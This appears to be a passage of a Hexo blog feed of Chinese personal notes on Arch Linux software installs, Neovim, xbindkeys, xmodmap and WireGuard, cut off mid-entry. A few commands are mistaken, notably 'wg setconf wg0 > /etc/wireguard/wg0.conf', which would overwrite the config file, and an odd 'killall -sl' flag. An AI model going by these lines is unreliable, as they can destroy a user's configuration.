  
  
  
  <entry>
    <title>Arch-中额外软件相关</title>
    <link href="/2022/09/19/Arch-%E4%B8%AD%E9%A2%9D%E5%A4%96%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%9B%B8%E5%85%B3/"/>
    <url>/2022/09/19/Arch-%E4%B8%AD%E9%A2%9D%E5%A4%96%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="图片相关"><a href="#图片相关" class="headerlink" title="图片相关"></a>图片相关</h1><h2 id="图片处理软件"><a href="#图片处理软件" class="headerlink" title="图片处理软件"></a>图片处理软件</h2><p>用 gimp, 可在 ArchWiki 上查看.</p><p>直接用 pacman 下载:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S gimp</span><br></code></pre></td></tr></table></figure><p>gimp 可以自定义快捷键. 配置文件在 <code>~/.config/GIMP</code> 目录里面.</p><p>gimp 有一个插件系统.</p><p>gimp 需要 poppler-glib 来预览 PDF 文件.</p><h2 id="截图软件"><a href="#截图软件" class="headerlink" title="截图软件"></a>截图软件</h2><p>用 flameshot.</p><p>下载:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S flameshot</span><br></code></pre></td></tr></table></figure><p>可以在进入 X 后打开 flameshot:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">flameshot <span class="hljs-meta">&amp;</span><br></code></pre></td></tr></table></figure><h1 id="音乐相关"><a href="#音乐相关" class="headerlink" title="音乐相关"></a>音乐相关</h1><h2 id="qq音乐"><a href="#qq音乐" class="headerlink" title="qq音乐"></a>qq音乐</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yay -S qqmusic-bin</span><br></code></pre></td></tr></table></figure><h1 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h1><h2 id="vlc-播放器"><a href="#vlc-播放器" class="headerlink" title="vlc 播放器"></a>vlc 播放器</h2><p>下载.</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S vlc</span><br></code></pre></td></tr></table></figure><p>可以更换语言, 具体看 ArchWiki.</p><p>可以换皮肤, <a href="https://www.videolan.org/vlc/skins.php">皮肤网站</a>. 然后将其放入 <code>~/.local/share/vlc/skin2/</code> 目录下.</p><p>可以在网站中打开. 具体看 ArchWiki.</p><p>可以使用 hotkeys.</p><h1 id="社交"><a href="#社交" class="headerlink" title="社交"></a>社交</h1><h2 id="deepin-qq"><a href="#deepin-qq" class="headerlink" title="deepin-qq"></a>deepin-qq</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yay -S deepin-wine-qq</span><br></code></pre></td></tr></table></figure><p>打开 qq 的脚本位于 <code>/opt/apps/com.qq.im.deepin/files/run.sh</code></p><p>可以在 <code>.bashrc</code> 文件中用 <code>alias</code> 处理一下.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sh-和-bash-的区别</title>
    <link href="/2022/09/19/sh-%E5%92%8C-bash-%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2022/09/19/sh-%E5%92%8C-bash-%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<p>sh 是 Bourne Shell, bash 是 Bourne-Again Shell.</p><p>在 Linux 上, <code>/bin/sh</code> 往往是 <code>/bin/bash</code> 的符号链接.</p><p>sh 可以算是开启了 POSIX 标准的 bash, 即 sh 在某行代码出错时, 不继续往下解释. </p>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Modern-Vim-Notes</title>
    <link href="/2022/09/18/Modern-Vim-Notes/"/>
    <url>/2022/09/18/Modern-Vim-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>在 <code>:help key-notation</code> 中可以查看键名.</p><p>默认的 <leader> key 是 <code>\</code>.</p><p>Neovim 可以用 <code>:terminal</code> 进入 TERMINAL 模式. 其会打开一个 terminal buffer.</p><p><code>set nocompatible</code> 意思就是不兼容以前的版本.</p><p>检查 filetype detection 已经打开:</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm">:file<span class="hljs-keyword">type</span><br></code></pre></td></tr></table></figure><h1 id="CHAPTER-1-Get-Modern-Vim"><a href="#CHAPTER-1-Get-Modern-Vim" class="headerlink" title="CHAPTER 1 Get Modern Vim"></a>CHAPTER 1 Get Modern Vim</h1><p>将 <code>$VISUAL</code> 这个变量设为 nvim, 可以让所有默认用 vim 的程序改用 nvim.</p><p>查看 <code>:help base-directories</code> 可以查看一些默认目录的位置.</p><p>对于 neovim 有两个比较重要的变量:</p><ul><li>VIMCONFIG, 一般设为 <code>~/.config/nvim</code></li><li>VIMDATA, 一般设为 <code>~/.local/share/nvim</code></li></ul><p>在 Neovim 中, 可以同时提供  Python2 和 Python3.</p><p>如使用 Python3:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl">:<span class="hljs-variable">py3</span> <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&#x27;hello&#x27;</span>)</span><br></code></pre></td></tr></table></figure><p>Neovim 用 providers 来 implement 一些 features.</p><p>可以用 <code>+</code> 和 <code>*</code> 这两个寄存器来和系统的 clipboard 互动.</p><p>安装 neovim-remote, 这个工具可以让你远程操控 neovim 进程, 其需要 Python3 支持:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">$ pip3 install --<span class="hljs-keyword">user</span> <span class="hljs-title">--upgrade</span> neovim-remote<br></code></pre></td></tr></table></figure><p>这个工具在命令行下使用是 <code>nvr</code>:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>nvr -h<br></code></pre></td></tr></table></figure><h1 id="CHAPTER-2-Installing-Plugins"><a href="#CHAPTER-2-Installing-Plugins" class="headerlink" title="CHAPTER 2 Installing Plugins"></a>CHAPTER 2 Installing Plugins</h1><p><code>command! Hello call SayHello()</code></p><p>这里, <code>command!</code> 这个命令的作用是创建一个命令. 单纯的运行 <code>:command</code> 这个指令会列出所有的用户定义的命令. 可以和 <code>:filter</code> 这个命令配合, 如 <code>:filter Coc command</code> 就会显示所有带 <code>Coc</code> 的命令. 加一个 <code>!</code> 的作用是可以 <mark>重定义</mark> 即覆盖掉之前的定义.</p><p>可以用  <code>:source</code> 来加载 script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:<span class="hljs-built_in">source</span> code/hello.vim<br></code></pre></td></tr></table></figure><p>每下载一个 plugin, 就需要将其添加到 Vim’s <code>runtimepath</code> 中.<br>如:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">:set runtimepath+=<span class="hljs-variable">$VIMCONFIG</span><span class="hljs-regexp">/arbitrary/</span>demo-plugin<br></code></pre></td></tr></table></figure><p>在 <code>:h</code> 的文档中跳转, 按下 <code>&lt;C-]&gt;</code> 跳转到指定的 anchor, 按下 <code>&lt;C-o&gt;</code> 跳回.</p><p>使用 <code>:helptags ALL</code> 将创建所有插件的 documentation, 到你的 <code>:help</code> 界面.</p><h1 id="CHAPTER-3-Opening-Files"><a href="#CHAPTER-3-Opening-Files" class="headerlink" title="CHAPTER 3 Opening Files"></a>CHAPTER 3 Opening Files</h1><p><code>:edit</code> 命令可以简写为 <code>:e</code>.</p><p><code>:vsplite</code> 命令可以简写为 <code>:vs</code>. </p><p>关于 fzf 工具, 在找到匹配项后, 按 <code>&lt;C-v&gt;</code> 可以在另一测打开文件. <code>&lt;C-x&gt;</code> 是 horizontal, <code>&lt;C-t&gt;</code> 是新的 tab 中打开.</p><p>fzf 默认是用 <code>find . -type f</code> 来查找文件, 可以利用 <code>FZF_DEFAULT_COMMAND</code> 这个环境变量来更改.</p><p>使用 <code>:buffer &#123;bufname&#125;</code> 可以在 buffer 之间跳转.</p><h1 id="CHAPTER-4-Working-with-the-Quickfix-List"><a href="#CHAPTER-4-Working-with-the-Quickfix-List" class="headerlink" title="CHAPTER 4 Working with the Quickfix List"></a>CHAPTER 4 Working with the Quickfix List</h1>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-neovim</title>
    <link href="/2022/09/18/%E5%85%B3%E4%BA%8E-neovim/"/>
    <url>/2022/09/18/%E5%85%B3%E4%BA%8E-neovim/</url>
    
    <content type="html"><![CDATA[<h1 id="与配置相关"><a href="#与配置相关" class="headerlink" title="与配置相关"></a>与配置相关</h1><p>参考 <code>:help config</code> 和 <code>:help nvim-from-vim</code>.</p><h2 id="从-vim-转换到-nvim"><a href="#从-vim-转换到-nvim" class="headerlink" title="从 vim 转换到 nvim"></a>从 vim 转换到 nvim</h2><p>nvim 和 vim 的区别可以查看 <code>:help vim-differences</code>.</p><p>neovim 的配置文件是 <code>init.vim</code>, 其位置取决于: <code>$XDG_CONFIG_HOME/nvim/init.vim</code></p><p>原来的 <code>.vim</code> 现在位于 <code>$XDG_CONFIG_HOME/nvim</code></p><h2 id="为什么在-Plugins-中用-Python"><a href="#为什么在-Plugins-中用-Python" class="headerlink" title="为什么在 Plugins 中用 Python"></a>为什么在 Plugins 中用 Python</h2><p>Python 能够提供 network sockets, 而且能够在后台长时间运行.</p><p>下在 neovim 的 python 包:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">pip3 install --<span class="hljs-keyword">user</span> <span class="hljs-title">neovim</span><br></code></pre></td></tr></table></figure><p>这个 <code>--user</code> flag 会将 <code>neovim</code> 安装到你的家目录. 缺点是每个用户都需要运行这行命令.</p><p>确认 location :</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> -m site<br></code></pre></td></tr></table></figure><h1 id="在打开-vim-时自动配置"><a href="#在打开-vim-时自动配置" class="headerlink" title="在打开 vim 时自动配置"></a>在打开 vim 时自动配置</h1>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Xbindkeys-安装和使用</title>
    <link href="/2022/09/18/Xbindkeys-%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/18/Xbindkeys-%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="某个-Tutorial"><a href="#某个-Tutorial" class="headerlink" title="某个 Tutorial"></a><a href="http://xahlee.info/linux/linux_xbindkeys_tutorial.html">某个 Tutorial</a></h1><p>可以用 xbindkeys 来 run shell commands.</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在 Arch Linux 上:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo pacman -S xbindkeys<br></code></pre></td></tr></table></figure><h2 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件"></a>创建配置文件</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">touch</span> ~/.xbindkeysrc<br></code></pre></td></tr></table></figure><p>示例内容:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># sample xbindkeys config</span><br><span class="hljs-comment"># place this file at ~/.xbindkeysrc</span><br><br><span class="hljs-comment"># make F8 launch Google Chrome browser</span><br><span class="hljs-string">&quot;google-chrome&quot;</span><br>F8<br><br><span class="hljs-comment"># make F3 do Ctrl+c</span><br><span class="hljs-string">&quot;xvkbd -no-jump-pointer -xsendevent -text &#x27;\Cc&#x27;&quot;</span><br>F3<br></code></pre></td></tr></table></figure><p>每一个 xbindkeys config 占两行. 第一行是 shell command, 第二行是 key.</p><h2 id="重新加载配置文件"><a href="#重新加载配置文件" class="headerlink" title="重新加载配置文件"></a>重新加载配置文件</h2><p>Reload the config file:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ killall -sl xbindkeys<br></code></pre></td></tr></table></figure><p>Start xbindkeys:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xbindkeys -f ~/.xbindkeysrc<br></code></pre></td></tr></table></figure><p>可以用 <code>xdg-open</code> 命令来打开文件.</p><h1 id="ArchWiki-相关页面"><a href="#ArchWiki-相关页面" class="headerlink" title="ArchWiki 相关页面"></a>ArchWiki 相关页面</h1><p><a href="https://wiki.archlinux.org/title/Xbindkeys">ArchWiki</a></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>生成配置文件:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xbindkeys -d &gt; ~/.xbindkeysrc<br></code></pre></td></tr></table></figure><p>使用 <code>#</code> 写注释.</p><h3 id="控制音量"><a href="#控制音量" class="headerlink" title="控制音量"></a>控制音量</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs perl">~/.xbindkeysrc<br><br><span class="hljs-comment"># Increase volume</span><br><span class="hljs-string">&quot;pactl set-sink-volume @DEFAULT_SINK@ +1000&quot;</span><br>   XF86AudioRaiseVolume<br><br><span class="hljs-comment"># Decrease volume</span><br><span class="hljs-string">&quot;pactl set-sink-volume @DEFAULT_SINK@ -1000&quot;</span><br>   XF86AudioLowerVolume<br><br><span class="hljs-comment"># Mute volume</span><br><span class="hljs-string">&quot;pactl set-sink-mute @DEFAULT_SINK@ toggle&quot;</span><br>   XF86AudioMute<br><br><span class="hljs-comment"># Mute microphone</span><br><span class="hljs-string">&quot;pactl set-source-mute @DEFAULT_SOURCE@ toggle&quot;</span><br>   XF86AudioMicMute<br></code></pre></td></tr></table></figure><h3 id="控制亮度"><a href="#控制亮度" class="headerlink" title="控制亮度"></a>控制亮度</h3><p>绑定到 <code>XF86MonBrightnessUp</code> 和 <code>XF86MonBrightnessDown</code>.</p><h3 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h3><p>安装 <code>xbindkeys_config-gtk2</code> 包.</p><h2 id="找某个键的-keycode"><a href="#找某个键的-keycode" class="headerlink" title="找某个键的 keycode"></a>找某个键的 keycode</h2><p>单个 key:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xbindkeys --key<br></code></pre></td></tr></table></figure><p>之后会出现一个界面来检测你按下的键.</p><p>之后输出如果为 (如果你按下的是 <code>Alt+o</code>):</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-string">&quot;(Scheme function)&quot;</span><br><span class="hljs-symbol">m:</span><span class="hljs-number">0x8</span> + c:<span class="hljs-number">32</span><br>Alt + o<br></code></pre></td></tr></table></figure><p>第一行表示的是这个键对应的 command.</p><p>第二行显示的是 state (0x8) 和 keycode (32), 和 <code>xev</code> 显示的内容一样.</p><p>第三行显示的是 keysyms 这里指真正的含义而不是键盘上的位置.</p><p>最后两行都可以用来添加到配置文件中表示键位.</p><p>multiple keys:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xbindkeys --multikey<br></code></pre></td></tr></table></figure><p>获取鼠标的参数就用 <code>xev</code>.</p><h2 id="使其永久生效"><a href="#使其永久生效" class="headerlink" title="使其永久生效"></a>使其永久生效</h2><p>将 <code>xbindkeys</code> 添加到 <code>~/.xinitrc</code> 中.</p><h2 id="多个键"><a href="#多个键" class="headerlink" title="多个键"></a>多个键</h2><p>鼠标上的键称为 “chording” key. 也可以用 xbindkeys 来设置.</p><p>具体看 wiki.</p><h1 id="xbindkeys-似乎和-dwm-相冲突了"><a href="#xbindkeys-似乎和-dwm-相冲突了" class="headerlink" title="xbindkeys 似乎和 dwm 相冲突了"></a>xbindkeys 似乎和 dwm 相冲突了</h1><p>只有在 <code>xbindkeys -n</code> 的模式下才其作用.</p><p>如果用 <code>xbindkeys</code> 命令使其进入 daemon 运行模式, 再运行 <code>xbindkeys -n</code>, 就会有如下报错:<br><img src="/../img/wrong_xbindkeys.png"></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>xmodmap-安装与使用</title>
    <link href="/2022/09/18/xmodmap-%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/18/xmodmap-%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Xmodmap_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">官方文档</a><br>xmodmap 是用于修改 Xorg 中键位图和指针映射的工具.</p><p>xmodmap 和 XKB (X keyboard extension) 没有直接关系.</p><p>注意, xmodmap 设置会被 setxkbmap 重置.</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Xorg 中有两种类型的键盘值: 键码和键符.</p><ul><li>键码 keycode, 表示按键或鼠标按钮被按下时, 内核收到的表示数字</li><li>键符 keysym, 是键码所对应的符号表达式, 意思是可以通过按下相应的键符对应的位置向内核发送 keycode. 字符形式或十六进制形式都可以, 如 <code>Shift_L</code> 和 (0x32) 是同一个意思, 表示的都是键盘上的位置, 比如这个就是左侧的 Shift 键</li></ul><p>比如, 按 <code>a</code> 产生 <code>38</code> 号 keycode, 它被映射到 <code>0x61</code> 号 keysym, 对应 ASCII 表中的 <code>a</code>.</p><p>keycode 和 keysym 的映射表可以用 <code>xmodmap</code> 查看.</p><p>内核对 keycode 的解释是定死了的, 但是按下什么键发送什么 keycode 是我们可以操控的.</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><code>xorg-xmodmap</code> 包提供 xmodmap.</p><p><code>xkeycaps</code> 包提供 xmodmap 的图形前端.</p><h1 id="键映射表"><a href="#键映射表" class="headerlink" title="键映射表"></a>键映射表</h1><p>以表达式格式呈现:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xmodmap -pke<br></code></pre></td></tr></table></figure><p>表中的 <code>Key</code> 表示 keycode 对应的按键.</p><p>如果要跳过一个 keysym, 将其值设置为 <code>NoSymble</code>.</p><p>多媒体键有预定义的描述性键符, 如 <code>XF86AudioMute</code>, 可在  <code>/usr/include/X11/XF86keysym.h</code> 中找到.</p><p>要永久改变, 可修改 <code>.xprofile</code> 或 <code>.xinitrc</code> 文件.</p><h1 id="自定义映射表"><a href="#自定义映射表" class="headerlink" title="自定义映射表"></a>自定义映射表</h1><p>创建一个映射列表:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xmodmap -pke &gt; ~/.Xmodmap<br></code></pre></td></tr></table></figure><p>测试更改:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xmodmap ~/.Xmodmap<br></code></pre></td></tr></table></figure><h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><p>在 <code>~/.xinitrc</code> 中添加:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">[[ -f ~/.Xmodmap ]] &amp;&amp; xmodmap ~/.Xmodmap<br></code></pre></td></tr></table></figure><h2 id="临时修改"><a href="#临时修改" class="headerlink" title="临时修改"></a>临时修改</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xmodmap -e <span class="hljs-string">&quot;keycode 46 = l L l L lstroke lstroke lstroke&quot;</span><br>$ xmodmap -e <span class="hljs-string">&quot;keysym a = e E&quot;</span><br></code></pre></td></tr></table></figure><h1 id="修饰键"><a href="#修饰键" class="headerlink" title="修饰键"></a>修饰键</h1><p>就是 modkey (mod 是 modifier 的意思). </p><p>对 <code>xmodmap -pm</code> 的输出的理解:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xmodmap -pm<br><br>xmodmap:  up to 4 keys per modifier, (keycodes <span class="hljs-keyword">in</span> parentheses):<br><br><span class="hljs-built_in">shift</span>       Shift_L (0x32),  Shift_R (0x3e)<br>lock        Caps_Lock (0x25)<br>control     Control_L (0x42),  Control_R (0x69)<br>mod1        Alt_L (0x40),  Alt_R (0x6c),  Alt_L (0xcc),  Meta_L (0xcd)<br>mod2        Num_Lock (0x4d)<br>mod3        ISO_Level5_Shift (0xcb)<br>mod4        Super_L (0x85),  Super_R (0x86),  Super_L (0xce),  Hyper_L (0xcf)<br>mod5        ISO_Level3_Shift (0x5c)<br><br></code></pre></td></tr></table></figure><p>应该是按右侧的键, 都可以表示左侧的修饰键. 就比如:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">shift </span>      <span class="hljs-keyword">Shift_L </span>(<span class="hljs-number">0x32</span>),  <span class="hljs-keyword">Shift_R </span>(<span class="hljs-number">0x3e</span>)<br></code></pre></td></tr></table></figure><p>表名, 按下左边的 Shift 和按下 右边的 Shift 都会产生 shift 修饰符的作用.</p><p>使用 <code>!</code> 作为注释.</p><h1 id="Man-page"><a href="#Man-page" class="headerlink" title="Man page"></a>Man page</h1><p>在 Man Page 中有语法讲解以及示例.</p><h2 id="xev-程序"><a href="#xev-程序" class="headerlink" title="xev 程序"></a>xev 程序</h2><p>这个软件打开后可用来检测 keycode 和 keysym 等信息.</p><h2 id="语法-keycode-Num-x3D-keysymname-…"><a href="#语法-keycode-Num-x3D-keysymname-…" class="headerlink" title="语法: keycode Num &#x3D; keysymname …"></a>语法: keycode Num &#x3D; keysymname …</h2><p>一个 keycode 最多绑定 8 个 keysym.</p><p>一个 key 后面跟着的 keysym 的含义:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">keycode 57 = n N<br></code></pre></td></tr></table></figure><p>这个位置有特别的含义, 出现在第一个位置表明 no modifier key is conjunction with this key, 第二个位置表明和 Shift 一起按, 第三个 with Mode_switch key, 第四个 with both Mode_switch and Shift.</p><h2 id="keycode"><a href="#keycode" class="headerlink" title="keycode"></a>keycode</h2><h2 id="clear-MODIFIERNAME"><a href="#clear-MODIFIERNAME" class="headerlink" title="clear MODIFIERNAME"></a>clear MODIFIERNAME</h2><p><code>clear</code> 后面可以跟: Shift, Lock, Control, Mod1, Mod2, Mod3, Mod4, Mod5 (modifier name 可以不区分大小写).</p><h1 id="参考一个-Tutorial"><a href="#参考一个-Tutorial" class="headerlink" title="参考一个 Tutorial"></a>参考一个 Tutorial</h1><p><a href="http://xahlee.info/linux/linux_xmodmap_tutorial.html">参考</a><br>xmodmap 不能做的事:</p><ul><li>不能将一个键变成, 按下这个键等于多个键的组合 </li><li>不能执行脚本</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Shell-中-eval-命令</title>
    <link href="/2022/09/17/Shell-%E4%B8%AD-eval-%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/09/17/Shell-%E4%B8%AD-eval-%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>在-vim-中通过光标所在位置打开文件</title>
    <link href="/2022/09/17/%E5%9C%A8-vim-%E4%B8%AD%E9%80%9A%E8%BF%87%E5%85%89%E6%A0%87%E6%89%80%E5%9C%A8%E4%BD%8D%E7%BD%AE%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6/"/>
    <url>/2022/09/17/%E5%9C%A8-vim-%E4%B8%AD%E9%80%9A%E8%BF%87%E5%85%89%E6%A0%87%E6%89%80%E5%9C%A8%E4%BD%8D%E7%BD%AE%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>wireguard-说明和使用</title>
    <link href="/2022/09/17/wireguard-%E8%AF%B4%E6%98%8E%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/17/wireguard-%E8%AF%B4%E6%98%8E%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.wireguard.com/">项目主页</a><br><a href="https://wiki.archlinux.org/title/WireGuard">ArchWiki 相关</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>WireGuard 是一种及其简单但快速且现代的 VPN.</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>安装 wireguard-tools 包:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S wireguard-tools</span><br></code></pre></td></tr></table></figure><p>systemd-networkd 和 NetworkManager 都为 WireGuard 接口设置提供原生支持.</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>使用 <code>ip link</code> 显示的 <code>wg0</code> 就是 wireguard.</p><h2 id="在-peer-上生成公钥和私钥"><a href="#在-peer-上生成公钥和私钥" class="headerlink" title="在 peer 上生成公钥和私钥"></a>在 peer 上生成公钥和私钥</h2><p>peer 就是那两台建立了隧道的主机.</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">$ wg genkey | <span class="hljs-type">tee</span> privatekey | <span class="hljs-type">wg</span> pubkey &gt; publickey<br></code></pre></td></tr></table></figure><h2 id="基本检查"><a href="#基本检查" class="headerlink" title="基本检查"></a>基本检查</h2><p>不带任何参数使用 wg 命令可以快速查看当前的配置.</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># wg</span><br></code></pre></td></tr></table></figure><p>此时可以 ping 通隧道的另一端.</p><h2 id="配置持久化"><a href="#配置持久化" class="headerlink" title="配置持久化"></a>配置持久化</h2><p>可以用 <code>showconf</code> 来保存:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># wg showconf wg0 &gt; <span class="hljs-regexp">/etc/</span>wireguard/wg0.conf <br># wg setconf wg0 &gt; <span class="hljs-regexp">/etc/</span>wireguard/wg0.conf <br></code></pre></td></tr></table></figure><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 